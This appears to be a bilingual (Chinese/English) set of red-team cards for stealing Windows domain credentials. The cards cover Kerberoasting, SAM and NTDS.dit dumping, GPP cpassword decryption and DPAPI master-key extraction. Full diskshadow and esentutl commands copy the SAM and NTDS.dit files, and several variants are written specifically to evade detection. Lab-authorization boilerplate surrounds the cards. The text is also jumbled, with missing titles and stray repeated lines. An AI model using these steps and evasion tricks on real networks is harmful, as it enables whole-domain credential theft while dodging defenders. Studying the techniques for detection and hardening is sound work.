name.zh: Kerberoasting 单账号暴露验证

description.zh: Kerberoasting 单账号暴露验证保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: Kerberoasting Single-Account Exposure Validation preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

subCategory.zh: 域凭据与 LSA 提取

prerequisites.zh: 确认 Kerberoasting 单账号暴露验证 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Kerberoasting Single-Account Exposure Validation are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 该 Payload 覆盖 Kerberoasting 单账号暴露验证场景，检验域内服务账号口令强度与票据可离线破解性。验证维度含 SPN 枚举、票据申请、导出、Rubeus 统计、Impacket 请求与离线破解六步，对应第 1 至第 6 步。
overview.en: This payload covers Kerberoasting single-account exposure validation, testing domain service-account password strength and offline crackability of tickets. Validation covers SPN enumeration, ticket request, export, Rubeus statistics, Impacket request and offline cracking, mapped to steps 1 through 6.

vulnerability.zh: 根因在于 Kerberos 服务票据以服务账号口令派生密钥加密且任何域用户都可申请：弱口令服务账号的票据被导出后可离线穷举，口令一旦命中即获得该账号身份。
vulnerability.en: The root cause is Kerberos service tickets encrypted with keys derived from the service-account password and requestable by any domain user: tickets for weak-password accounts can be exported and brute-forced offline, and a hit grants that account's identity.

exploitation.zh: 第 1 步用 setspn 查询全部 SPN 列出服务账号；第 2 步以 .NET 请求目标 SPN 票据入缓存；第 3 步用 mimikatz 导出 .kirbi 文件；第 4 步以 Rubeus stats 统计可请求账号；第 5 步用 GetUserSPNs.py 输出可破解哈希；第 6 步以 hashcat 配字典破解，跑出口令即确认弱凭据。占位符在全局变量菜单替换；仅限授权实验域。
exploitation.en: In step 1, list service accounts by enumerating all SPNs with setspn. In step 2, request the target SPN ticket via .NET into cache. In step 3, export .kirbi files with mimikatz. In step 4, tally requestable accounts with Rubeus stats. In step 5, emit crackable hashes with GetUserSPNs.py. In step 6, crack with hashcat and a wordlist; a recovered password confirms weak credentials. Replace placeholders via the global variables menu; authorized lab domain only.

mitigation.zh: 服务账号改用 gMSA 或 25 位以上随机口令，启用 AES 加密并对票据请求量异常告警。修复后重放第 6 步，弱口令应不再可破解且监控捕获第 2、5 步的申请行为。
mitigation.en: Move service accounts to gMSA or 25-plus-character random passwords, enable AES encryption, and alert on anomalous ticket request volume. After the fix, replay step 6: weak passwords should no longer crack, and monitoring should catch the step 2 and 5 requests.

title.zh: 枚举域内 SPN 服务账号

description.zh: 用 setspn 的全域查询列出全部 SPN 记录；输出 HTTP、MSSQL 等服务账号清单即锁定可申请票据的高价值目标，优先挑选高权限账号。
description.en: Query every SPN in the domain with setspn; the HTTP/MSSQL service account list marks the high-value targets whose tickets can be requested.

description.zh: 通过 .NET 的 KerberosRequestorSecurityToken 为目标 SPN 申请服务票据；命令执行后本机票据缓存新增 TGS 即拿到可离线破解的凭据材料。
description.en: Request a ticket for the target SPN via KerberosRequestorSecurityToken; a fresh TGS in the local cache is the offline-cracking material.

description.zh: 用 mimikatz 的 kerberos::list /export 导出缓存中的票据；当前目录生成 .kirbi 文件即完成凭据落盘，可拷回攻击机进入破解环节。
description.en: Export cached tickets with mimikatz kerberos::list /export; the .kirbi file appearing on disk is ready to copy back for cracking.

title.zh: 换用 Impacket 一体化通道
title.en: Switch to the Impacket all-in-one channel

description.zh: 用 GetUserSPNs.py 的 request 模式一条命令完成枚举与请求，直接输出可破解哈希；无需登录图形机，与前三步互为备份，出哈希即可继续。
description.en: Run GetUserSPNs.py -request to enumerate and fetch in one shot, printing crackable hashes directly; no desktop logon needed and it backs up the earlier steps.

title.zh: 离线破解服务账号口令

description.zh: 用 hashcat 的 13100 模式加载字典破解票据哈希；跑出明文口令即获得服务账号凭据，可横向移动到该账号注册的全部服务主机。
description.en: Crack the ticket hash with hashcat mode 13100; the recovered plaintext yields a service-account credential for lateral movement to every host running that SPN.

analysis.zh: Kerberoasting 单账号暴露验证只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Kerberoasting Single-Account Exposure Validation is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 仅对合成服务账号的单个 SPN 核对票据加密类型、密码策略和离线审计边界。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

title.zh: RC4 定向请求规避变体

description.zh: 绕过全量 SPN 请求的批量告警（Kerberos 服务票据洪泛检测）：仅定向请求单账号 RC4 票据。成功判据：kerb.txt 含单账号可破解哈希。
description.en: Evades bulk-SPN request alerts (service-ticket flooding detection) by requesting only one targeted account's RC4 ticket. Success: kerb.txt contains one crackable hash.

description.zh: 绕过 etype23(RC4) 弱加密票据告警：请求 AES 票据（etype 0x11/0x12），事件侧为正常加密协商。成功判据：返回 AES 哈希且可离线破解。
description.en: Evades etype23 (RC4) weak-ticket alerts by requesting AES tickets (etype 0x11/0x12), which look like normal crypto negotiation. Success: an AES hash returns and cracks offline.

title.zh: GC 端口通道规避变体

description.zh: 绕过对 88 端口 Kerberos 请求的集中监控：经全局目录 3268 通道完成取票。成功判据：经 3268 获取服务票据哈希。
description.en: Evades concentrated monitoring of port-88 Kerberos requests by fetching tickets through the global catalog on 3268. Success: ticket hashes are obtained via 3268.

name.zh: SAM 凭据存储访问控制审计

description.zh: SAM 凭据存储访问控制审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: SAM Credential-Store Access-Control Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

subCategory.zh: 本机注册表与保护存储

prerequisites.zh: 确认 SAM 凭据存储访问控制审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for SAM Credential-Store Access-Control Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 该 Payload 覆盖 SAM 凭据存储访问控制审计场景，检验本地账户哈希的读取路径与防护边界。验证维度含注册表导出、离线解析、Mimikatz 直读与卷影副本复制四步，对应第 1 至第 4 步。
overview.en: This payload covers SAM credential-store access-control auditing, testing read paths and protection boundaries for local account hashes. Validation covers registry export, offline parsing, direct Mimikatz reads and shadow-copy extraction, mapped to steps 1 through 4.

vulnerability.zh: 根因在于 SAM 配置单元依赖 SYSTEM 密钥加密而读取面暴露给高权限进程：具备管理员或卷影能力的攻击者可直接导出并离线还原全部本地账户哈希。
vulnerability.en: The root cause is the SAM hive being readable by high-privilege processes despite SYSTEM-key encryption: attackers with admin or shadow-copy capability export it directly and recover all local account hashes offline.

exploitation.zh: 第 1 步用 reg save 同时导出 SAM 与 SYSTEM 配置单元，生成两个 hive 即成功；第 2 步以 secretsdump.py LOCAL 模式离线解析输出 RID 与哈希；第 3 步用 mimikatz lsadump::sam 直读对照；第 4 步经卷影副本复制 SAM 验证绕过文件锁路径。任一路径产出哈希即确认存储可读。占位符在全局变量菜单替换；仅授权主机执行。
exploitation.en: In step 1, export SAM and SYSTEM together with reg save; two hives mark success. In step 2, parse offline with secretsdump.py LOCAL mode yielding RIDs and hashes. In step 3, cross-check with mimikatz lsadump::sam. In step 4, copy SAM via shadow copy validating the file-lock bypass. Any path producing hashes confirms readable storage. Replace placeholders via the global variables menu; run only on authorized hosts.

mitigation.zh: 限制 SAM 相关注册表键与卷影服务的访问权限，启用 Credential Guard 并监控 reg save 与 vssadmin 调用。修复后重放第 1、4 步，导出与复制应被拒绝并产生告警。
mitigation.en: Restrict access to SAM registry keys and the shadow-copy service, enable Credential Guard, and monitor reg save and vssadmin invocations. After the fix, replay steps 1 and 4: export and copy should be denied with alerts.

title.zh: 导出 SAM 与 SYSTEM 配置单元

description.zh: 用 reg save 分别导出 HKLM 下的 SAM 与 SYSTEM 配置单元；当前目录生成两个 hive 文件即拿到本地凭据存储副本，规避在线读取触发的告警。
description.en: Save the SAM and SYSTEM hives with reg save; two hive files on disk give an offline copy of local credential storage without tripping in-memory alerts.

description.zh: 用 secretsdump.py 以 sam 与 system 参数组合离线解析配置单元；输出本地账户 RID 与 NTLM 哈希即提取出可用于哈希传递的凭据材料。
description.en: Parse the hives offline with secretsdump.py -sam -system LOCAL; local RIDs and NTLM hashes come out as pass-the-hash material.

description.zh: 若文件导出受阻，改用 mimikatz 的 lsadump::sam 直接从内存读取；输出 SAM 账户哈希即确认第二条提取路径同样可用。
description.en: When file export is blocked, read directly with mimikatz lsadump::sam; SAM hashes still flowing out confirm a second extraction path.

title.en: Bypass file locks via shadow copy

description.zh: 用 vssadmin 创建卷影副本并从中复制被占用的 SAM 文件；绕过运行时锁定拿到副本后，交回第 2 步的命令继续离线解析。
description.en: Create a shadow copy with vssadmin and copy the in-use SAM out of it; the lock-free copy feeds straight back into the step-2 parsing.

analysis.zh: SAM 凭据存储访问控制审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: SAM Credential-Store Access-Control Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 核对 SAM 与 SYSTEM hive 的文件 ACL、备份权限和访问审计，不导出真实 hive 或哈希。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

wafBypass.command: esentutl.exe /y C:\Windows\System32\config\SAM /d C:\Windows\Temp\sam.copy && esentutl.exe /y C:\Windows\System32\config\SYSTEM /d C:\Windows\Temp\sys.copy

description.zh: 绕过 reg save 命令的进程监控特征：以 esentutl 平滑复制 hive。成功判据：副本可被离线解析出 SAM 哈希。
description.en: Evades process monitoring on reg save by copying hives smoothly with esentutl. Success: the copies parse offline into SAM hashes.

wafBypass.command: (echo set context volatile nowritable & echo add volume C: alias s1 & echo create & echo expose %%s1%% Z: & echo exec "cmd /c copy Z:\Windows\System32\config\SAM C:\Windows\Temp\s2.hive") > C:\Windows\Temp\d.txt && diskshadow.exe /s C:\Windows\Temp\d.txt

description.zh: 绕过 vssadmin 特征并以易失卷影避免持久副本残留。成功判据：s2.hive 提取成功。
description.en: Evades vssadmin signatures and uses a volatile shadow to avoid persistent copy residue. Success: s2.hive is extracted.

description.zh: 绕过目标侧工具落地（mimikatz 等）：hive 已在操作机，目标无后续进程。成功判据：仅输出目标用户哈希。
description.en: Evades tooling landing on the target (mimikatz etc.) since the hives are already on the operator machine and no further target processes run. Success: only the target user's hash is output.

name.zh: NTDS.dit 备份与访问边界审计

description.zh: NTDS.dit 备份与访问边界审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: NTDS.dit Backup and Access-Boundary Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

subCategory.zh: 域凭据与 LSA 提取

prerequisites.zh: 确认 NTDS.dit 备份与访问边界审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for NTDS.dit Backup and Access-Boundary Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 该 Payload 覆盖 NTDS.dit 备份与访问边界审计场景，检验域数据库文件的提取路径与 DCSync 复制面。验证维度含 ntdsutil 快照、卷影复制、离线解析与两步远程 DCSync，对应第 1 至第 5 步。
overview.en: This payload covers NTDS.dit backup and access-boundary auditing, testing extraction paths for the domain database and the DCSync replication surface. Validation covers an ntdsutil snapshot, shadow copying, offline parsing, and two remote DCSync steps, mapped to steps 1 through 5.

vulnerability.zh: 根因在于域控本地管理员与具备复制权限的账户可以导出 NTDS.dit 或模拟复制流程：一旦路径可达，全部域账户哈希含 krbtgt 即被一次性拖走。
vulnerability.en: The root cause is domain-local administrators and accounts with replication rights being able to export NTDS.dit or emulate replication: once a path is reachable, every domain hash including krbtgt is exfiltrated at once.

exploitation.zh: 第 1 步用 ntdsutil 的 ifm 模式创建完整快照；第 2 步经卷影副本复制 NTDS.dit 验证第二路径；第 3 步以 secretsdump.py LOCAL 模式解析出域账户哈希；第 4 步用复制权限测试账号执行 just-dc 远程同步；第 5 步以 mimikatz dcsync 对照确认。任一路径产出 krbtgt 哈希即确认边界失守。占位符在全局变量菜单替换；仅限授权域。
exploitation.en: In step 1, create a full snapshot with ntdsutil ifm mode. In step 2, copy NTDS.dit via shadow copy validating the second path. In step 3, parse domain hashes with secretsdump.py LOCAL mode. In step 4, run just-dc remotely with a replication-authorized test account. In step 5, cross-confirm with mimikatz dcsync. Any path yielding the krbtgt hash confirms the boundary breach. Replace placeholders via the global variables menu; authorized domains only.

mitigation.zh: 清理域控本地管理员成员并按需委派复制权限，启用 DCSync 与卷影操作的监控告警。修复后重放第 4、5 步，未授权复制应被拒绝并触发高等级告警。
mitigation.en: Prune domain-controller local administrators and delegate replication on demand, with monitoring alerts on DCSync and shadow operations. After the fix, replay steps 4 and 5: unauthorized replication should be denied with high-severity alerts.

title.zh: 用 ntdsutil 制作 IFM 快照
title.en: Create an IFM snapshot with ntdsutil

description.zh: 以 ntdsutil 的 IFM 模式创建安装介质快照；temp 目录生成含 ntds.dit 与 SYSTEM 的目录即拿到域库副本，且操作形式与合法备份一致、隐蔽性高。
description.en: Build an IFM snapshot via ntdsutil; the output folder holding ntds.dit and SYSTEM is a domain-store copy disguised as routine backup activity.

title.zh: 卷影副本直接复制域库
title.en: Copy the store via shadow copy

description.zh: 创建卷影副本并从 HarddiskVolumeShadowCopy 路径复制 NTDS.dit 与 SYSTEM；文件落盘即绕过域库运行时的独占锁定，备好离线解析材料。
description.en: Spin up a shadow copy and pull NTDS.dit plus SYSTEM from the HarddiskVolumeShadowCopy path; files landing on disk bypass the runtime lock for offline parsing.

description.zh: 用 secretsdump.py 以 ntds 与 system 参数离线解析域库；输出全部域账户的 NTLM 哈希即完成域凭据整体收割，可逐个尝试哈希传递。
description.en: Parse the store offline with secretsdump.py -ntds -system LOCAL; the full NTLM set for every domain account completes wholesale credential harvesting.

description.zh: 用 secretsdump.py 的 just-dc 模式通过目录复制协议直接向域控拉取；无需落地域库文件，拿到 krbtgt 哈希即具备铸造黄金票据的原料。
description.en: Invoke -just-dc to pull via the directory replication protocol; no file drop needed, and the krbtgt hash is the golden-ticket ingredient.

title.en: Dump all domain hashes with mimikatz

description.zh: 用 mimikatz 的 dcsync 全量模式模拟域控间复制拉取全部账号哈希；与第 4 步互为备份通道，任一成功即完成全域凭据控制。
description.en: Run lsadump::dcsync /all to imitate inter-DC replication and pull every hash; as a backup to step 4, either channel succeeding means full domain credential control.

analysis.zh: NTDS.dit 备份与访问边界审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: NTDS.dit Backup and Access-Boundary Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 核对域控制器数据库、卷影副本、IFM 与复制权限边界，不复制数据库或提取域凭据。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

wafBypass.command:
diskshadow.exe /s C:\Windows\Temp\ds.txt
(set context volatile nowrite
add volume C: alias myshadow
create
expose %myshadow% Z:\nexec "cmd /c copy Z:\Windows\NTDS\NTDS.dit C:\Windows\Temp\n.dit"
reset)

description.zh: 绕过 vssadmin 创建影子副本的进程特征：diskshadow 脚本化完成同等的卷影复制与提取。成功判据：n.dit 生成且可被 secretsdump 解析。
description.en: Evades vssadmin shadow-copy process signatures by scripting the same copy+extract flow through diskshadow. Success: n.dit is produced and parses with secretsdump.

title.zh: 最小权限 DCSync 规避变体

description.zh: 绕过全库转储的体量告警（海量 replsecret 事件）：仅同步单目标账号。成功判据：dcs.txt 仅含目标账号哈希。
description.en: Evades full-database volume alerts (mass replsecret events) by syncing only one targeted account. Success: dcs.txt contains only the target's hashes.

title.zh: IFM 备份通道规避变体

description.zh: 绕过直接读取 NTDS.dit 的文件审计：走安装媒体（IFM）合法备份通道产出库文件。成功判据：ifm 目录含 ntds.dit 与 SYSTEM hive。
description.en: Evades direct NTDS.dit read auditing by using the installable-media (IFM) backup channel. Success: the ifm folder contains ntds.dit plus the SYSTEM hive.

name.zh: GPP cpassword 遗留配置审计

description.zh: GPP cpassword 遗留配置审计保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: Legacy GPP cpassword Configuration Audit preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

prerequisites.zh: 确认 GPP cpassword 遗留配置审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Legacy GPP cpassword Configuration Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 该 Payload 覆盖 GPP cpassword 遗留配置审计场景，检验 SYSVOL 中组策略偏好是否残留可解密口令。验证维度含 XML 检索、PowerView 提取、单值解密与域控批量抓取五步中的四类路径，对应第 1 至第 5 步。
overview.en: This payload covers GPP cpassword legacy-configuration auditing, testing whether Group Policy preferences in SYSVOL still hold decryptable passwords. Validation covers XML discovery, PowerView extraction, single-value decryption and domain-controller batch retrieval, mapped to steps 1 through 5.

vulnerability.zh: 根因在于组策略偏好历史版本使用公开 AES 密钥加密 cpassword 字段且补丁后旧文件残留：任何域用户读取 SYSVOL 即可还原历史本地管理员口令。
vulnerability.en: The root cause is legacy Group Policy preferences encrypting cpassword with a published AES key while unpatched files linger: any domain user reading SYSVOL can recover historical local-admin passwords.

exploitation.zh: 第 1 步在 SYSVOL 递归查找 XML 输出路径清单；第 2 步以 PowerShell 确认可读范围；第 3 步用 PowerView 的 Get-NetGPPPassword 提取用户名与明文；第 4 步用 gpp-decrypt 解密单个 cpassword 验证；第 5 步用 Get-GPPPassword.py 批量抓取。任一路径还原明文即确认遗留口令。占位符在全局变量菜单替换。
exploitation.en: In step 1, recursively find XML under SYSVOL printing paths. In step 2, confirm readability with PowerShell. In step 3, extract usernames and plaintext with PowerView's Get-NetGPPPassword. In step 4, decrypt a single cpassword with gpp-decrypt. In step 5, batch-retrieve with Get-GPPPassword.py. Any path recovering plaintext confirms the lingering password. Replace placeholders via the global variables menu.

mitigation.zh: 安装 KB2962486 清除历史 cpassword，轮换曾用于组策略的本地口令并审计 SYSVOL 全量文件。修复后重放第 1、5 步，检索应无 cpassword 残留且批量抓取为空。
mitigation.en: Install KB2962486 to purge historical cpassword values, rotate local passwords once used in GPO, and audit the full SYSVOL tree. After the fix, replay steps 1 and 5: no cpassword remnants should be found and batch retrieval returns empty.

title.zh: 定位 SYSVOL 组策略 XML
title.en: Locate group policy XML in SYSVOL

description.zh: 在域 SYSVOL 共享递归查找全部 XML 文件；输出组策略偏好文件清单即锁定可能携带 cpassword 字段的目标，任何域用户都可读该共享。
description.en: Recursively find XML files on the SYSVOL share; the Group Policy Preferences list marks targets likely carrying a cpassword field, readable by any domain user.

description.zh: 从 XML 中取出 cpassword 字段并用 gpp-decrypt 以微软公开的 AES 密钥解密；输出明文即还原历史本地管理员口令，可直接尝试远程登录。
description.en: Pull the cpassword value and decrypt it with gpp-decrypt using the public Microsoft AES key; the plaintext restores the old local-admin password for direct reuse.

description.zh: 用 PowerView 的 Get-NetGPPPassword 自动扫描并解密组策略口令；直接输出用户名与明文即跳过手工解析，快速摸清口令遗留的覆盖范围。
description.en: Run Get-NetGPPPassword to auto-scan and decrypt; usernames with plaintext come out directly, mapping the leftover-password surface without manual parsing.

title.zh: 远程批量收割残留口令

description.zh: 用 Get-GPPPassword.py 连接域控自动抓取并解密全部组策略口令；批量拿到多组凭据后即可尝试口令复用，横向移动到同口令主机。
description.en: Point Get-GPPPassword.py at the DC to fetch and decrypt every stored password in bulk; the batch of credentials feeds password-reuse lateral movement.

An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

review.rationale: 在固定 SYSVOL 测试目录检测遗留 cpassword 字段与权限，不递归全域或解密真实凭据。 该条目保留为具体技术验证卡，保留可复现攻击能力，仅修复不可执行叙述和明显占位符，并补充隔离授权、回滚和蓝队证据要求。

description.zh: 绕过 PowerShell 模块加载特征（PowerView/Get-GPPPassword 告警）：原生 findstr 直接扫 SYSVOL。成功判据：输出含 cpassword 的策略 XML 行。
description.en: Evades PowerShell module-load signatures (PowerView/Get-GPPPassword alerts) by scanning SYSVOL with native findstr. Success: lines with cpassword from policy XMLs are output.

description.zh: 绕过在线工具的出网审计：cpassword 已离线在手时本地 AES 解密（公开微软密钥）。成功判据：输出明文口令。
description.en: Evades outbound auditing of online tools by decrypting the already-exfiltrated cpassword locally with the public Microsoft key. Success: the plaintext password is output.

title.zh: 远程 RPC 取盘规避变体

description.zh: 绕过 SMB 挂载式 SYSVOL 浏览日志：经远程接口定向解析策略文件。成功判据：返回 cpassword 明文集合。
description.en: Evades SMB-mount SYSVOL browsing logs by parsing policy files through remote interfaces. Success: a set of decrypted cpassword values returns.

name.zh: DPAPI 保护范围与审计验证

description.zh: DPAPI 保护范围与审计验证保留原始可复现技术命令，并将执行范围限定在书面授权、可回滚的隔离实验环境；仅修复明显占位符、纯叙述行和不可执行片段，同时要求关联身份、主机、目录、网络和安全产品证据。
description.en: DPAPI Protection-Scope and Audit Validation preserves the original reproducible technique commands while restricting execution to a written, reversible, isolated lab authorization. Only obvious placeholders, narrative-only lines, and non-executable fragments are repaired, with identity, host, directory, network, and security-product evidence required.

subCategory.zh: 本机注册表与保护存储

prerequisites.zh: 确认 DPAPI 保护范围与审计验证 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for DPAPI Protection-Scope and Audit Validation are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

overview.zh: 该 Payload 覆盖 DPAPI 保护范围与解密路径审计场景，检验受保护凭据 blob 与主密钥的可提取性。验证维度含凭据目录枚举、blob 解密与内存主密钥提取三步，对应第 1 至第 3 步。
overview.en: This payload covers DPAPI protection-scope and decryption-path auditing, testing how extractable protected credential blobs and master keys are. Validation covers credential-directory enumeration, blob decryption and in-memory master-key extraction, mapped to steps 1 through 3.

vulnerability.zh: 根因在于 DPAPI 主密钥由用户口令派生且以可还原形式驻留内存与配置：攻击者拿到用户上下文即可枚举 blob，配合内存提取的主密钥离线还原全部保存凭据。
vulnerability.en: The root cause is DPAPI master keys deriving from the user password while remaining recoverable in memory and profile files: an attacker in the user context can enumerate blobs and, with memory-extracted master keys, restore every saved credential offline.

exploitation.zh: 第 1 步枚举用户 Credentials 目录列出受保护 blob 文件即定位完成；第 2 步用 mimikatz 的 dpapi::cred 解密指定 blob，输出凭据明文即确认保护范围可穿越；第 3 步以 sekurlsa::dpapi 从内存提取 master key 及关联 GUID，供离线解密其他 blob。以明文凭据输出为成功判据。占位符在全局变量菜单替换；仅在授权实验会话内操作。
exploitation.en: In step 1, enumerate the user Credentials directory to list protected blob files. In step 2, decrypt a chosen blob with mimikatz dpapi::cred; plaintext output confirms the protection scope is crossable. In step 3, extract master keys with associated GUIDs from memory via sekurlsa::dpapi for offline decryption of other blobs. Use plaintext credential output as the success criterion. Replace placeholders via the global variables menu; operate only inside authorized lab sessions.

mitigation.zh: 为敏感凭据启用域级 DPAPI 备份限制与 LSA 保护，终端监控对 Credentials 目录与 LSASS 的异常访问。修复后重放第 2、3 步，解密与内存提取应被阻断并产生告警。
mitigation.en: Enable domain-scoped DPAPI backup restrictions and LSA protection for sensitive credentials, monitoring anomalous access to the Credentials directory and LSASS. After the fix, replay steps 2 and 3: decryption and memory extraction should be blocked with alerts.

title.zh: 枚举 DPAPI 凭据文件

description.zh: 列出用户 Credentials 目录下的隐藏 blob 文件；输出文件名与修改时间即定位受保护凭据的存储位置，文件越多可收割的秘密越多。
description.en: List hidden blobs in the user's Credentials folder; filenames and timestamps locate the DPAPI-protected secrets ready for decryption.

description.zh: 用 mimikatz 的 dpapi::cred 指定 blob 路径解密；输出明文口令或保存的远程资源凭据即还原受保护秘密，可立即用于登录对应服务。
description.en: Decrypt a chosen blob with mimikatz dpapi::cred; plaintext passwords or saved remote credentials come out ready for reuse.

title.zh: 提取 Master Key 扩大解密面
title.en: Extract master keys to widen decryption

description.zh: 用 sekurlsa::dpapi 从 LSASS 内存提取 master key；拿到密钥与关联 GUID 即可离线解密该用户的全部 blob，完成整个账户的凭据收割。
description.en: Pull master keys from LSASS with sekurlsa::dpapi; key plus GUID enables offline decryption of every blob belonging to that user.

An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 绕过 mimikatz 进程特征与内存扫描：以机器账号哈希离线推导 masterkey。成功判据：解出 masterkey 列表。
description.en: Evades mimikatz process signatures and memory scans by deriving masterkeys offline with the machine account hash. Success: the masterkey list decrypts.

title.zh: 域备份密钥批量规避变体

description.zh: 绕过逐用户交互（每次 mimikatz 调用一条告警）：导出域 DPAPI 备份密钥后离线批量解密任意用户 blob。成功判据：备份密钥可解密目标凭据文件。
